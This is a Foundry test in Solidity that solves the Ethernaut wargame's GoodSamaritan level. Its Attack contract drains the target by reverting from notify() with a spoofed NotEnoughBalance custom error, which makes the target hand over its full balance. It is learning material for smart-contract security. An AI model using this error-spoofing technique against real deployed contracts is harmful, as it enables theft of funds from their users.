// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/GoodSamaritan/GoodSamaritanFactory.sol";
import "../src/Ethernaut.sol";

contract GoodSamaritanTest is StdCheats, Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testGoodSamaritanHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        GoodSamaritanFactory goodSamaritanFactoryFactory = new GoodSamaritanFactory();
        ethernaut.registerLevel(goodSamaritanFactoryFactory);
        address levelAddress = ethernaut.createLevelInstance(goodSamaritanFactoryFactory);
        GoodSamaritan goodSamaritan = GoodSamaritan(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        Attack attack = new Attack(address(goodSamaritan));
        attack.attack();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    GoodSamaritan goodSamaritan;

    error NotEnoughBalance();

    constructor(address goodSamaritanAddress) {
        goodSamaritan = GoodSamaritan(goodSamaritanAddress);
    }

    function attack() public {
        goodSamaritan.requestDonation();
    }

    function notify(uint256 amount) external {
        require(amount != 10, NotEnoughBalance());
    }
}
